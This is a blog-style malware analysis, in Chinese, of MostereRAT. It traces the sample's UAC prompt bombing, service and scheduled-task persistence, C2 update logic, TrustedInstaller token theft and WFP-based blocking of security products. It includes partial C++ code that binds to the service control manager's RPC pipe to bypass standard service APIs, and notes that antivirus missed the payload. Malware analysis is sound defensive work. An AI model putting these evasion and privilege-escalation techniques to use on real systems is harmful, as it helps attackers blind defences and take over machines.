@@ -1,0 +1,733 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#15171a">
+  <meta name="description" content="https://www.fortinet.com/blog/threat-research/mostererat-deployed-anydesk-tightvnc-for-covert-full-access 任务： 该样本通过 “CreateSvcRpc” 技术创建具有系统权限的服务，这一技术在代码层面是如何实现的？ 该样本能够创建一...">
+  <meta name="author" content="YCr0w">
+  <title>MostereRAT | YCr0w&#39;blog</title>
+  <link rel="icon" type="image/x-icon" href="/assets/site/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/site.css">
+  <script src="/assets/vendor/lucide.js" defer></script>
+  <script src="/assets/js/site.js" defer></script>
+</head>
+<body class="article-page">
+  <header class="site-header">
+    <div class="header-profile">
+      <a class="header-identity" href="/" aria-label="返回首页"><img class="header-avatar" src="/assets/site/avatar.jpg" alt="YCr0w"><span class="header-name">YCr0w</span></a>
+      <div class="header-links"><a href="https://github.com/YCr0w" target="_blank" rel="noopener" aria-label="GitHub"><i data-lucide="github" aria-hidden="true"></i></a><a href="mailto:3083981460@qq.com" aria-label="Email"><i data-lucide="mail" aria-hidden="true"></i></a></div>
+    </div>
+    <button class="nav-toggle icon-button" type="button" aria-label="打开导航"><i data-lucide="menu" aria-hidden="true"></i></button>
+    <nav class="main-nav" aria-label="主导航">
+      <a href="/"><i data-lucide="house" aria-hidden="true"></i><span>首页</span></a><a href="/categories/"><i data-lucide="folder-tree" aria-hidden="true"></i><span>分类</span></a><a href="/archives/"><i data-lucide="archive" aria-hidden="true"></i><span>归档</span></a><a href="/about/"><i data-lucide="user-round" aria-hidden="true"></i><span>关于</span></a>
+    </nav>
+    <div class="header-actions">
+      <div class="search-inline" id="search-inline">
+        <button class="icon-button" id="search-button" type="button" aria-label="搜索" aria-expanded="false"><i data-lucide="search" aria-hidden="true"></i></button>
+        <input id="search-input" type="search" placeholder="搜索文章、标签或分类" autocomplete="off">
+        <div class="search-results" id="search-results"></div>
+      </div>
+      <button class="icon-button" id="theme-button" type="button" aria-label="切换主题"><i data-lucide="sun-moon" aria-hidden="true"></i></button>
+    </div>
+  </header>
+  <main class="article-shell">
+    <article class="article"><header class="article-header"><a class="article-category" href="/categories/malware-analysis/" style="--category-color:#d84a5b"><span class="category-dot"></span>恶意软件分析</a><h1>MostereRAT</h1><p>https://www.fortinet.com/blog/threat-research/mostererat-deployed-anydesk-tightvnc-for-covert-full-access 任务： 该样本通过 “CreateSvcRpc” 技术创建具有系统权限的服务，这一技术在代码层面是如何实现的？ 该样本能够创建一...</p><div class="article-meta"><span><i data-lucide="calendar-days" aria-hidden="true"></i>2026年8月13日</span><span><i data-lucide="clock-3" aria-hidden="true"></i>28 分钟阅读</span></div><div class="tag-list"></div></header><div class="article-body markdown-body"><p><a href="https://www.fortinet.com/blog/threat-research/mostererat-deployed-anydesk-tightvnc-for-covert-full-access">https://www.fortinet.com/blog/threat-research/mostererat-deployed-anydesk-tightvnc-for-covert-full-access</a></p>
+<p>任务：</p>
+<ol>
+<li>该样本通过 “CreateSvcRpc” 技术创建具有系统权限的服务，这一技术在代码层面是如何实现的？</li>
+<li>该样本能够创建一个具有 TrustInstaller 权限的进程，它具体是如何实现的？</li>
+<li>该样本通过创建 Windows Filtering Platform (WFP) 规则阻断 AV/EDR 的网络流量，其具体的 API 调用流程是什么，创建了哪个 WFP 层/子层、使用了哪些过滤条件和权重优先级？</li>
+</ol>
+<h2 id="document.exe">document.exe</h2>
+<p>HASH</p>
+<p>SHA256:4e3cdeba19e5749aa88329bc3ac67acd777ea7925ba0825a421cada083706a4e</p>
+<p>MD5:a9b52f654370a25d25af4554c25c2cc9</p>
+<p>SHA1:7065ec1c8d8cccf6be22d21f781e278f307720ad  </p>
+<p><img src="/assets/posts/mostererat/images/1761725739040-d7c8cb40-f69a-4a46-b187-6cdba654a790.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>这个文件存在一个正常的数字签名</p>
+<p>直接运行之后会显示UAC弹窗，采用UAC弹窗"炸弹"的方式进行提权，提权运行之后显示版本不兼容</p>
+<p><img src="/assets/posts/mostererat/images/1761726750094-af78e9b7-aa4d-4d14-8c2f-d05012bdee1e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>此可执行文件基于 <a href="https://github.com/wxWidgets/wxWidgets/tree/master/samples/menu">wxWidgets</a>GitHub 存储库中的菜单示例，用于部署后续阶段的必要工具。该工具集经过加密并捆绑在可执行文件的资源中，并包含名人的图像：</p>
+<p><img src="/assets/posts/mostererat/images/1761730363485-add76107-76c0-4e56-884b-241975d07fb2.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1761730418736-cd9d988c-30f3-4727-a41f-a0c463075c95.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>使用IDA分析</p>
+<p> WinMain函数前面部分进行了初始化操作，真正的是同vtable调用虚函数进入的</p>
+<p><img src="/assets/posts/mostererat/images/1761727437237-18b51e30-0bca-4909-9da0-6f17b9193f8b.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>call eax跟进之后，这是一个虚函数，*this + 92 计算 vtable 条目在偏移量 92 字节处的地址（指针为 4 字节，可能是第 23 个虚函数）</p>
+<p><img src="/assets/posts/mostererat/images/1761727906569-ae9a88af-e7ab-4357-9a59-84e08c2d41a3.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>跳转到虚函数所在位置</p>
+<p><img src="/assets/posts/mostererat/images/1761728032662-aad5009b-47e5-4a28-b2ce-462617697292.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>提权操作</h4>
+<p><img src="/assets/posts/mostererat/images/1761728080786-a869ce89-2958-454a-9a45-462b01408596.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>采用while循环给用户弹UAC弹窗，只有用户同意提权才会退出循环，提权成功会使用<code>ShellExecuteExW</code>创建一个以管理员权限运行相同进程，然后使用<code>TerminateProcess</code>立即退出</p>
+<p><img src="/assets/posts/mostererat/images/1761729687328-85ce1fc5-e154-4d58-8d12-221e2bc5b482.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>构造路径 <code>C:\ProgramData\Windows\tmp\&lt;随机名&gt;</code>，使用系统运行时间 (<code>GetTickCount64</code>) 生成随机文件名</p>
+<p><img src="/assets/posts/mostererat/images/1761732063068-d80d4f41-bdf1-489b-b404-14f9c538ad11.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>从自身资源节中加载 ID 为 <code>0x6E</code> 的 <code>"BMP"</code> 类型资源  </p>
+<p>接着使用一个简单的SUB操作解密数据，密钥值为‘ A ’。与远程监控和管理（RMM）工具和下一阶段有效负载相关的所有组件都放在<code>C:\ProgramData\Windows</code>中</p>
+<p><img src="/assets/posts/mostererat/images/1761730076913-800e964a-1715-40fa-a9d4-9b1152b35b92.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1761730081943-e2634561-ac2a-4c7e-9145-57d59898692e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>持久化</h4>
+<p>创建 <code>WpnCoreSvc</code> Windows服务，服务指向Ruby脚本执行恶意载荷，使用直接RPC调用绕过API监控</p>
+<p><img src="/assets/posts/mostererat/images/1761729340287-a5f1e81f-97c2-44db-80a3-423945066dda.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>接着使用 <a href="https://www.x86matthew.com/view_post?id=create_svc_rpc">CreateSvcRpc 进入下一阶段，CreateSvcRpc</a> 是一个自定义 RPC 客户端，它直接与 ntsvcs 命名管道通信以与 Windows 服务控制管理器 （SCM） 交互，绕过标准 API，如 OpenSCManager、CreateService、StartService 等。生成的服务以 SYSTEM 级权限运行。</p>
+<p><img src="/assets/posts/mostererat/images/1761731667779-c57fcda5-9c63-488a-aef5-e34c37b81db6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>“WpnCoreSvc”是使用自动启动类型创建的，确保它在系统启动期间由服务控制管理器加载，以便通过 Ruby 脚本执行下一阶段。另一个创建的服务“WinSvc_”被配置为需求启动，并通过直接调用攻击者提供的启动器来启动下一阶段。</p>
+<p><img src="/assets/posts/mostererat/images/1761732148360-4aff1cec-1adf-4b3a-bef7-5d5caf727457.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>为两个创建的服务执行的命令如下：<br><img src="/assets/posts/mostererat/images/1761731963843-34374cd2-9911-4d05-8663-ba5baa589f0b.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>代码实现：</p>
+<pre><code class="hljs language-cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;rpc.h&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"rpcrt4.lib"</span>)   <span class="hljs-comment">// Link with RPC runtime library </span></span>
+ 
+<span class="hljs-function">HANDLE <span class="hljs-title">EstablishRpcConnection</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-comment">//  连接到SCM的命名管道 </span>
+    HANDLE hPipe = <span class="hljs-built_in">CreateFileA</span>(
+        <span class="hljs-string">"\\\\.\\pipe\\ntsvcs"</span>,
+        GENERIC_READ | GENERIC_WRITE,
+        <span class="hljs-number">0</span>, 
+        <span class="hljs-literal">NULL</span>, 
+        OPEN_EXISTING, 
+        <span class="hljs-number">0</span>, 
+        <span class="hljs-literal">NULL</span> 
+    );
+ 
+    <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to open pipe. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+ 
+    <span class="hljs-comment">// 构造RPC主头 </span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rpcHeader[<span class="hljs-number">4</span>];
+    rpcHeader[<span class="hljs-number">0</span>] = <span class="hljs-number">0x030A3BFD</span>;  <span class="hljs-comment">// Version and flags </span>
+    rpcHeader[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;          <span class="hljs-comment">// Size of header </span>
+    rpcHeader[<span class="hljs-number">2</span>] = <span class="hljs-number">72</span>;          <span class="hljs-comment">// Total size of header + payload </span>
+    rpcHeader[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>;           <span class="hljs-comment">// Bind request type </span>
+ 
+    <span class="hljs-comment">// 构造BIND负载 </span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> rpcBindPayload[<span class="hljs-number">56</span>] = {<span class="hljs-number">0</span>};
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">0</span>]  = <span class="hljs-number">268439552</span>;  <span class="hljs-comment">// Max transmit size</span>
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">4</span>]  = <span class="hljs-number">0</span>;          <span class="hljs-comment">// Max receive size</span>
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">8</span>]  = <span class="hljs-number">1</span>;          <span class="hljs-comment">// Assoc group</span>
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">12</span>] = <span class="hljs-number">0x10000</span>;    <span class="hljs-comment">// Context ID </span>
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">32</span>] = <span class="hljs-number">2</span>;          <span class="hljs-comment">// Num transfer syntaxes </span>
+    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;rpcBindPayload[<span class="hljs-number">52</span>] = <span class="hljs-number">2</span>;          <span class="hljs-comment">// Num context items</span>
+ 
+    <span class="hljs-comment">// 填充接口UUID</span>
+    UUID interfaceUuid;
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UuidFromStringA</span>((RPC_CSTR)<span class="hljs-string">"367abb81-9844-35f1-ad32-98f038001003"</span>, &amp;interfaceUuid) != RPC_S_OK) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to convert interface UUID\n"</span>);
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+    <span class="hljs-built_in">memcpy</span>(&amp;rpcBindPayload[<span class="hljs-number">16</span>], &amp;interfaceUuid, <span class="hljs-built_in">sizeof</span>(UUID));
+ 
+    <span class="hljs-comment">// 填充传输语法UUID </span>
+    UUID transferSyntaxUuid;
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UuidFromStringA</span>((RPC_CSTR)<span class="hljs-string">"8a885d04-1ceb-11c9-9fe8-08002b104860"</span>, &amp;transferSyntaxUuid) != RPC_S_OK) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to convert transfer syntax UUID\n"</span>);
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+    <span class="hljs-built_in">memcpy</span>(&amp;rpcBindPayload[<span class="hljs-number">36</span>], &amp;transferSyntaxUuid, <span class="hljs-built_in">sizeof</span>(UUID));
+ 
+    <span class="hljs-comment">// 发送构造好的BIND包 </span>
+    DWORD bytesWritten = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WriteFile</span>(hPipe, rpcHeader, <span class="hljs-built_in">sizeof</span>(rpcHeader), &amp;bytesWritten, <span class="hljs-literal">NULL</span>) || 
+        bytesWritten != <span class="hljs-built_in">sizeof</span>(rpcHeader)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to write RPC header. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+ 
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WriteFile</span>(hPipe, rpcBindPayload, <span class="hljs-built_in">sizeof</span>(rpcBindPayload), &amp;bytesWritten, <span class="hljs-literal">NULL</span>) || 
+        bytesWritten != <span class="hljs-built_in">sizeof</span>(rpcBindPayload)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to write RPC bind payload. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+ 
+    <span class="hljs-comment">// 读取SCM的响应 </span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> responseBuffer[<span class="hljs-number">1024</span>] = {<span class="hljs-number">0</span>};
+    DWORD bytesRead = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ReadFile</span>(hPipe, responseBuffer, <span class="hljs-built_in">sizeof</span>(responseBuffer), &amp;bytesRead, <span class="hljs-literal">NULL</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to read response. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+ 
+  
+    <span class="hljs-keyword">if</span> (bytesRead &lt; <span class="hljs-number">24</span> || *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)&amp;responseBuffer[<span class="hljs-number">20</span>] != <span class="hljs-number">0</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"RPC bind failed in response\n"</span>);
+        <span class="hljs-built_in">CloseHandle</span>(hPipe);
+        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;
+    }
+ 
+    <span class="hljs-keyword">return</span> hPipe;
+}
+ 
+<span class="hljs-function">BOOL <span class="hljs-title">PerformServiceHijack</span><span class="hljs-params">(HANDLE hPipe)</span> </span>{
+    <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE) {
+        <span class="hljs-keyword">return</span> FALSE;
+    }
+
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> rpcRequestPacket[<span class="hljs-number">4096</span>] = {<span class="hljs-number">0</span>}; 
+    
+    DWORD bytesWritten = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">WriteFile</span>(hPipe, rpcRequestPacket, <span class="hljs-built_in">sizeof</span>(rpcRequestPacket), &amp;bytesWritten, <span class="hljs-literal">NULL</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error: Failed to send request packet. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-keyword">return</span> FALSE;
+    }
+ 
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> finalResponse[<span class="hljs-number">1024</span>] = {<span class="hljs-number">0</span>};
+    DWORD bytesRead = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ReadFile</span>(hPipe, finalResponse, <span class="hljs-built_in">sizeof</span>(finalResponse), &amp;bytesRead, <span class="hljs-literal">NULL</span>)) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error: Failed to read final response. Error: %d\n"</span>, <span class="hljs-built_in">GetLastError</span>());
+        <span class="hljs-keyword">return</span> FALSE;
+    }
+ 
+    <span class="hljs-keyword">return</span> TRUE;
+}
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    HANDLE hScmPipe = <span class="hljs-built_in">EstablishRpcConnection</span>();
+ 
+    <span class="hljs-keyword">if</span> (hScmPipe == INVALID_HANDLE_VALUE) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n无法建立与系统核心服务的底层连接。\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+ 
+    <span class="hljs-comment">// 执行服务劫持</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">PerformServiceHijack</span>(hScmPipe)) {
+     <span class="hljs-comment">//   printf("\n已模拟完整的服务劫持流程。\n");</span>
+    } <span class="hljs-keyword">else</span> {
+       <span class="hljs-comment">// printf("\n在服务劫持过程中发生错误。\n");</span>
+    }
+ 
+    <span class="hljs-comment">// 清理资源 </span>
+    <span class="hljs-built_in">CloseHandle</span>(hScmPipe);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre><p>在终止之前，该程序会以简体中文显示一条虚假消息，指出系统版本不兼容，并指示用户在另一台计算机上运行该程序，从而通过社会工程继续传播。</p>
+<p><img src="/assets/posts/mostererat/images/1761733609130-05019ff9-c12c-492b-a67d-80cdff27b7a6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>持久化之后AV对载荷的拦截效果</h4>
+<p>360：好像不拦，但是查杀会停在这好久了，下面那个页面也打不开</p>
+<p><img src="/assets/posts/mostererat/images/1762323770442-1bf5351a-4d56-44f9-861b-541fc2bdce02.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>Windows defender:这个重启之后不拦，变成下面了</p>
+<p><img src="/assets/posts/mostererat/images/1762322843904-1f154796-81f2-4823-b2c7-6e7209b93bef.png" alt="MostereRAT" loading="lazy" decoding="async">  </p>
+<h2 id="简易编程语言">简易编程语言</h2>
+<h3 id="ruby.exe">ruby.exe</h3>
+<p>调用该程序的system()函数启动svchost.exe</p>
+<p><img src="/assets/posts/mostererat/images/1762322926456-606d20c9-9216-4259-86ec-924a3a399dd4.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h3 id="svchost.exe">svchost.exe</h3>
+<p>调用<code>krnln.fnr</code>的<code>LoadEPKFromCmdLine</code>运行svchost.db文件（svchost.db文件为epk文件</p>
+<p><img src="/assets/posts/mostererat/images/1762324457813-21e30a33-d258-4a40-8a97-eaf50add65ab.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h3 id="krnln.fnr">krnln.fnr</h3>
+<p>LoadEPKFromCmdLine函数获取传入的命名然后对epk文件进行操作</p>
+<p><img src="/assets/posts/mostererat/images/1762340450163-db59ab1e-f777-4ff9-85d5-bb65e3e981c3.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>调用LoadEPKData函数对指定的epk文件进行加载</p>
+<p><img src="/assets/posts/mostererat/images/1762340507398-19e0b46c-3dcc-4de1-be88-483f44a1a3a4.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762337532877-01a5bdac-13b3-4489-848b-dd0e5aca6434.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>channel-8df91be7c24a-channel-8df91be7c24e由maindll.db模块处理</p>
+<p>channel-8df91be7c24f由elsedll.db模块处理</p>
+<p><img src="/assets/posts/mostererat/images/1762340588716-e99ef934-5681-4d96-b811-5aab88661220.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.db文件解密逻辑，对单字节减去0x41</p>
+<p><img src="/assets/posts/mostererat/images/1762350422924-cff4c291-232b-4b18-b36d-06dade258535.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762437269175-2b3cfbc6-26d0-4f7b-b25d-babb550842c6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>然后将模块加载到内存中，并调用其导出的函数“getVersion”。</p>
+<h3 id="maindll.db">maindll.db</h3>
+<p>getVersion：</p>
+<p>提升进程权限：</p>
+<h3><img src="/assets/posts/mostererat/images/1762684229337-5a248d63-78a4-4652-b3e9-88f0f3984bde.png" alt="MostereRAT" loading="lazy" decoding="async"></h3>
+<h4>多通道执行逻辑</h4>
+<p>Channel A: <code>channel-8df91be7c24a</code>（升级并启动新程序、模块/通过重复执行恶意代码实现持久性）</p>
+<p><img src="/assets/posts/mostererat/images/1762684503840-a5bede89-1570-4f89-a251-326c902f7a7a.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>升级并启动新程序、模块</h5>
+<p>创建两个线程，sub_10010E40:</p>
+<p>加载RSA私钥字符串</p>
+<p><img src="/assets/posts/mostererat/images/1762693096572-a43f51a3-1ab2-4497-8e53-8cee1d183406.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>构建C2服务器URL列表</p>
+<p><img src="/assets/posts/mostererat/images/1762939339405-780f66ef-b0b8-42ea-bfa8-e0460812c25f.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762939401714-41442b16-4361-4148-93db-268fcb212051.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>进行端口号处理</p>
+<p><img src="/assets/posts/mostererat/images/1762693565625-99ca0202-077b-47d5-8ec3-8274442de8bc.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>配置文件在服务器上可用，利用RSA私钥解密配置文件，表明新版本已准备好下载。</p>
+<p><img src="/assets/posts/mostererat/images/1762940236488-58b155d1-f7eb-4a29-830a-7aa8efe9dc86.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>解析配置文件<br><img src="/assets/posts/mostererat/images/1762940627290-b40912b3-719f-4248-bdc3-2bc57ff5432e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762940696447-0c260677-fe69-46b6-baa9-a15430ab0cf5.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>比较版本号以确定是否需要下载新的有效载荷<img src="/assets/posts/mostererat/images/1762940717562-3c615901-bbe8-48e3-a75e-ad48f5909475.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>据线程参数执行不同操作，通过 HTTP 使用端口 9001 和 9002 与命令和控制 (C2) 服务器通信。端口 9001 负责 EXE 有效载荷，而端口 9002 则处理 EPK 有效载荷：</p>
+<p><img src="/assets/posts/mostererat/images/1762691807480-1350f3ef-7f50-43da-81c0-bc09a5bb9d91.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>通过重复执行恶意代码实现持久性</h5>
+<p>sub_1000C690：</p>
+<p>从资源中加载定义计划作业的 XML 文件。它注册作业“Microsoft\Windows\winrshost”和“Microsoft\Windows\winresume”</p>
+<p><img src="/assets/posts/mostererat/images/1762686124390-6dcc5be5-fede-4182-b945-ed62f65a993f.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>创建一个名为“DnsNetwork”的服务，用于启动一个带有附加参数的新实例</p>
+<p><img src="/assets/posts/mostererat/images/1762685537333-347bb3ac-2a2a-4f5f-8890-a76c1ff4b357.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>这些实例配置为自动运行——在系统启动期间以 SYSTEM 帐户（SID：S-1-5-18）运行，并在用户登录后以内置的 Administrators 组（SID：S-1-5-32-544）运行</p>
+<p><img src="/assets/posts/mostererat/images/1762686329676-ff10d8cb-2bd2-4cb1-8971-74d18324f2e5.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762686383276-cbb5d961-e8bf-4db3-8dfd-1dbc58b1ed5d.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>Channel B: <code>channel-8df91be7c24b</code>（以 TrustedInstaller 身份运行/干扰AV/EDR解决方案）</p>
+<p><img src="/assets/posts/mostererat/images/1762686806576-db9e27e1-16fc-4126-ab73-972dad89f497.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>sub_10012150:</p>
+<p><img src="/assets/posts/mostererat/images/1762941253692-6a1ca07f-04de-4319-a228-483ff6c7b57f.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>以 TrustedInstaller 身份运行</h5>
+<p>sub_10003410:</p>
+<p>当前进程权限提升（首先启用 SeDebugPrivilege 权限，并复制自身进程令牌，使其拥有提升的权限。）</p>
+<p><img src="/assets/posts/mostererat/images/1762687388568-f805a9d2-dfb3-4e9d-b8d0-aba43caf9cd1.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>系统权限获取（查找并复制一个 SYSTEM 进程令牌）</p>
+<p><img src="/assets/posts/mostererat/images/1762687654821-0f5321a7-c628-43cc-b5f8-b6ef1a546a40.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>TrustedInstaller权限获取</p>
+<p><img src="/assets/posts/mostererat/images/1763548333684-018f8cd0-ce0f-4b6f-a459-db4e8beb1b26.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762687753099-d2c9340c-5a74-4151-8acc-a8d0dcb0feea.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>令牌操作和权限设置</p>
+<p><img src="/assets/posts/mostererat/images/1762687904037-c8402dc5-3167-4eab-b064-bfe49493c7f1.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>环境准备/高权限进程创建（使用 TrustedInstaller 令牌启动一个具有完整权限的新进程。）</p>
+<p><img src="/assets/posts/mostererat/images/1762687957292-c5aa54e7-391b-469d-b189-3590695f5c51.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>干扰AV/EDR解决方案</h5>
+<p>sub_1000B210:</p>
+<p><img src="/assets/posts/mostererat/images/1762688532994-a31df25b-0e87-4d23-95bc-d1eb07586834.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>该恶意软件包含两个内置列表：一个用于安全产品路径，另一个用于安全产品名称。</p>
+<p>安全产品路径：</p>
+<p><img src="/assets/posts/mostererat/images/1762688606958-dc89c29e-22d3-49bf-a6af-1aaf186ac77e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>安全产品名称：</p>
+<p><img src="/assets/posts/mostererat/images/1762688652090-d60c2587-6364-4c24-a656-d625f1a8f0c9.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>它首先扫描目标路径中的可执行文件，检查是否存在安全解决方案。</p>
+<p><img src="/assets/posts/mostererat/images/1762689613067-fb7ea92d-0a3f-4cc5-9443-f3e111cfa989.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>然后，它将这些可执行文件与正在运行进程的镜像文件路径进行比较<br><img src="/assets/posts/mostererat/images/1762689658512-33273b9f-41e8-46c6-9ac0-1e23ee93bf96.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.........</p>
+<p><img src="/assets/posts/mostererat/images/1762689708092-cd0be00b-a4b5-43bf-8270-020e74e23303.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>如果找到匹配项，且镜像路径包含已知的安全产品名称，则恶意软件会阻止其流量。</p>
+<p><img src="/assets/posts/mostererat/images/1762689871676-2eec682f-fc77-4b4b-aa49-f06272bc8f97.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>Channel C: <code>channel-8df91be7c24c</code></p>
+<p><img src="/assets/posts/mostererat/images/1762690113121-59d753fe-e5bb-46a9-89ef-654cbca3895f.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>Channel D: <code>channel-8df91be7c24d</code>（禁用 Windows 安全）</p>
